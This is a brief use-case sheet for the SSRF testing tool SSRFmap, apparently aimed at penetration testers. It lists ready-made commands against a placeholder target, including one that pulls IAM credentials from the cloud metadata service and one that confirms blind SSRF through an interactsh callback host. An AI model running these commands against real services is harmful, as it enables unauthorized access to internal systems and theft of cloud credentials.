# SSRFmap — Use Cases

## Scenario 1: Webhook Endpoint
```bash
# Capture request to webhook endpoint, save as request, then:
ssrfmap -u "http://target.com/api/webhooks?callback=FUZZ" -m read
```

## Scenario 2: Cloud Metadata Exfiltration
```bash
ssrfmap -u "http://target.com/api?url=FUZZ" -m read \
  --lhost 169.254.169.254 \
  --lpath /latest/meta-data/iam/security-credentials/
```

## Scenario 3: Import/Fetch Features
```bash
# Any feature that fetches a URL server-side:
ssrfmap -u "http://target.com/api/import?src=FUZZ" -m read
ssrfmap -u "http://target.com/api/preview?url=FUZZ" -m read
```

## Scenario 4: Blind SSRF with Interactsh
```bash
# Get interactsh URL, use as payload
ssrfmap -u "http://target.com/api?url=https://YOUR.interactsh.com/test" -m read
```
DNS callback to interactsh confirms blind SSRF.

## Scenario 5: GraphQL URL Input Types
Check for URL input fields in GraphQL mutations. These are often overlooked and may enable SSRF via the GraphQL layer.
